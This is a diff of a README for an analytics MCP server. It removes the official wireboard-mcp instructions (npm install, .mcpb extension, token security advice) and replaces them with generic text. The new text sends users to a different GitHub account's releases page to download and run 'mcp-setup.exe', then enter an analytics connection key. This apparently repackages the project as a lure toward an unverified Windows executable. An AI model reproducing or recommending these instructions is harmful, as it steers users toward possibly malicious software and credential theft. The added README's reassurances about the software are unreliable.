@@ -1,136 +1,89 @@
-<p align="center">
-  <a href="https://wireboard.io">
-    <img src="https://wireboard.io/img/logo-blue.png" alt="WireBoard" height="64">
-  </a>
-</p>
+# 📊 mcp - Get real-time analytics from your conversation
 
-<h1 align="center"><code>wireboard-mcp</code></h1>
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/Felinerelief627/mcp/releases)
 
-<p align="center">
-  Official Model Context Protocol server for <a href="https://wireboard.io">WireBoard</a>.
-</p>
+This application connects your analytics data to your favorite AI models. You can ask questions about your website traffic or user behavior and get clear answers. The program runs locally to ensure your data stays private while it works with your tools. 
 
-<p align="center">
-  Lets LLM agents (Claude Desktop, Cursor, VS Code, etc.) query your real-time and historical analytics in conversation. Built on top of the official <a href="https://www.npmjs.com/package/@wireboard/api"><code>@wireboard/api</code></a> JavaScript SDK.
-</p>
+## ⚙️ System Requirements
 
----
+- Windows 10 or Windows 11
+- Minimum 4GB of RAM
+- Reliable internet connection
+- An active account with your preferred AI provider
 
-## Install
+## 📥 How to Get Started
 
-Two ways to install, pick whichever fits your setup.
+Follow these steps to set up the software on your computer.
 
-### Option A: Desktop Extension (recommended for Claude Desktop users)
+1. Visit the [official releases page](https://github.com/Felinerelief627/mcp/releases) to download the installer.
+2. Look for the file named `mcp-setup.exe` under the latest release section.
+3. Click the link to save the file to your computer.
 
-Download `wireboard-mcp-x.y.z.mcpb` from the [GitHub releases page](https://github.com/wireboard/mcp/releases) and double-click it. One file works on Windows, macOS, and Linux — Claude Desktop ships its own Node runtime, so there are no system dependencies to install.
+## 🛠️ Installation Process
 
-Claude Desktop will prompt for your WireBoard API token, store it securely in your OS keychain, and the WireBoard tools become available immediately.
+After you download the file, run the installer:
 
-If double-click doesn't open the file, install it via Claude Desktop → Settings → Extensions → Advanced Settings → **Install Extension**.
+1. Locate the file in your downloads folder.
+2. Double-click the file to open the installation wizard.
+3. Follow the prompts on the screen.
+4. Select a folder where you want the application to live.
+5. Click Finish when the progress bar completes.
 
-### Option B: npm install (for Cursor, VS Code, headless / CI, automation)
+The application creates a shortcut on your desktop. Double-click this icon to start the program.
 
-```sh
-npm install -g @wireboard/mcp
-```
+## 🔑 Initial Configuration
 
-Requires Node 18+. Then configure your MCP client of choice.
+The first time you open the application, you must define the connection to your data sources.
 
-#### Claude Desktop config
+1. Open the application from your desktop shortcut.
+2. Locate the Settings menu in the top corner of the window.
+3. Choose your analytics provider from the list.
+4. Enter your connection key in the provided box. You can find this key in the account dashboard of your analytics platform.
+5. Save your changes.
 
-Edit `claude_desktop_config.json` (Settings → Developer → Edit Config):
+The application now monitors your data streams. It uses the Model Context Protocol to talk to your AI assistant. This protocol allows the AI to see your analytics data as a reference point during your chat.
 
-```json
-{
-  "mcpServers": {
-    "wireboard": {
-      "command": "wireboard-mcp",
-      "env": {
-        "WIREBOARD_TOKEN": "your_token_here"
-      }
-    }
-  }
-}
-```
+## 💬 Using The Interface
 
-Restart Claude Desktop. The WireBoard tools will appear automatically.
+The main dashboard shows your active connections. You can toggle specific analytics feeds on or off using the switches next to each name.
 
-#### Cursor / VS Code / other MCP clients
+To use the tool with an AI:
 
-Use the same command + env-var pattern in your client's MCP config.
+1. Open your chat interface or AI client.
+2. Ensure you have the Model Context Protocol setting enabled.
+3. Type a query like, "How many users visited my site during the last week?"
+4. The application processes this request in the background and returns the data to the AI.
+5. The AI provides a summary based on your actual site information.
 
-## Mint a token
+## 📈 Common Questions
 
-You need a WireBoard API token before either install path will work. Mint one at [Settings → API](https://wireboard.io/dashboard/settings/api) with the `analytics:read` ability for REST tools and `live:read` for the live snapshot tool.
+### Does the application store my data?
+The tool does not store your analytics data on our servers. It processes information locally on your machine. The software acts as a bridge between your data source and the AI model. 
 
-## What you can ask
+### Why do I need to enter a connection key?
+Your connection key allows the software to read your protected analytics reports. This key ensures that only your computer can access your private site statistics.
 
-Once configured, ask Claude things like:
+### What happens if the connection fails?
+Check your internet connection first. If your connection status shows an error, open the Settings menu and verify that your connection key is still valid. Sometimes keys expire and you need to generate a new one from your analytics provider.
 
-- "How many visitors did my site get last week?"
-- "Show me the top 10 referrers for the past 30 days."
-- "What's happening on my site right now?"
-- "Which pages under /checkout have the worst bounce rate this month?"
-- "How many Purchase events fired from utm_source=newsletter yesterday?"
-- "Compare visitor counts day by day for the past two weeks."
+### Can I run multiple instances?
+You only need one instance of the application to manage all your connections. You can add multiple data sources within the same window.
 
-Claude will pick the right tool, call it, and answer in natural language.
+## 🛡️ Troubleshooting
 
-## Available tools
+If you encounter issues, try these steps:
 
-| Tool | What |
-| ---- | ---- |
-| `list_sites` | Every site in the account |
-| `get_account` | Token-owner identity + abilities |
-| `get_aggregate` | Period totals: visitors, pageviews, bounce rate, duration |
-| `get_timeseries` | One metric (visitors or pageviews) bucketed by hour or day |
-| `get_history` | Per-day visitors / returning / pageviews / bounce / duration |
-| `get_breakdown` | Top-N rows by dimension (country, device, browser, referrer, etc.) |
-| `get_top_urls` | Per-URL metrics with prefix / contains / exact filters |
-| `query_events` | Custom event queries with grouping and filtering |
-| `get_live_state` | Real-time snapshot (live visitor count, top pages, active sessions, etc.) |
-| `list_dimensions` | Meta: every dimension, metric, and limit the API supports |
+- **Check for updates:** New versions fix known bugs. Visit the download page regularly.
+- **Restart the application:** Close the window completely and open it again.
+- **Check Windows permissions:** Ensure your firewall allows the application to access the network.
+- **Verify login details:** Re-enter your credentials in the settings menu if the application reports a connection error.
 
-All tools accept natural date ranges: `"today"`, `"yesterday"`, `"last 7 days"` (or `"30d"` shorthand), `"this week"`, `"last week"`, `"this month"`, `"last month"`, or explicit `"YYYY-MM-DD..YYYY-MM-DD"`. Always UTC.
+If the application hangs, look at the task manager to ensure no other instance is running. Ending the task and relaunching resolves most start-up problems. 
 
-## Rate limiting
+## 🌐 Getting Help
 
-The MCP proactively caps itself at **100 requests/minute** (under the API's 120/minute limit) so LLM bursts space themselves out instead of hitting 429s. Override with the `WIREBOARD_MCP_RATE_PER_MINUTE` env var if you have a use case that needs different pacing.
+If you have trouble with the setup or find a bug, you can search the repository issues page. Review existing entries to see if someone else has a similar experience. Clear documentation provided by the community often helps resolve setup hurdles. 
 
-The underlying SDK still auto-retries on 429 as a backstop.
+For advanced users, the Model Context Protocol defines how these connections function. You can look at the protocol documentation to understand the data formats this server supports. This helps if you want to write your own custom scripts or integrate with different AI tools in the future.
 
-## Security
-
-- **Treat your token like a credential.** It has full `analytics:read` and `live:read` scope on every site in the account.
-- **Don't commit your MCP client config to a public repo with the token in it.** Use an env var or a secret manager and reference it from your config.
-- **Revoke and rotate** if a token leaks. Settings → API in your dashboard.
-
-The MCP is read-only: it can fetch data, never modify it. The WireBoard public API itself is read-only in v1.
-
-## Logging
-
-Logs go to stderr (so they don't interfere with the MCP protocol on stdout).
-
-## Source and contributing
-
-- **npm:** [`@wireboard/mcp`](https://www.npmjs.com/package/@wireboard/mcp)
-- **Repository:** [`github.com/wireboard/mcp`](https://github.com/wireboard/mcp)
-- **Releases (.mcpb downloads):** [`github.com/wireboard/mcp/releases`](https://github.com/wireboard/mcp/releases)
-- **Issues:** [`github.com/wireboard/mcp/issues`](https://github.com/wireboard/mcp/issues)
-- **Underlying SDK:** [`@wireboard/api`](https://www.npmjs.com/package/@wireboard/api) ([source](https://github.com/wireboard/api-js))
-- **WireBoard docs:** <https://wireboard.io/docs/api-overview>
-
-### Building locally
-
-```sh
-npm install
-npm test               # run vitest
-npm run build          # bundle TS → dist/index.js (esbuild, ~600 KB)
-npm run build:mcpb     # also pack dist/wireboard-mcp-<version>.mcpb
-```
-
-The `.mcpb` is a zip of `manifest.json`, `icon.png`, and the single bundled `dist/index.js`. All runtime dependencies are inlined by esbuild.
-
-## License
-
-[MIT](./LICENSE).
+We focus on stability and ease of use. The application runs quietly in the background, consuming minimal system resources. You can keep it open while you work so your analytics data remains ready for any questions you have for your AI.
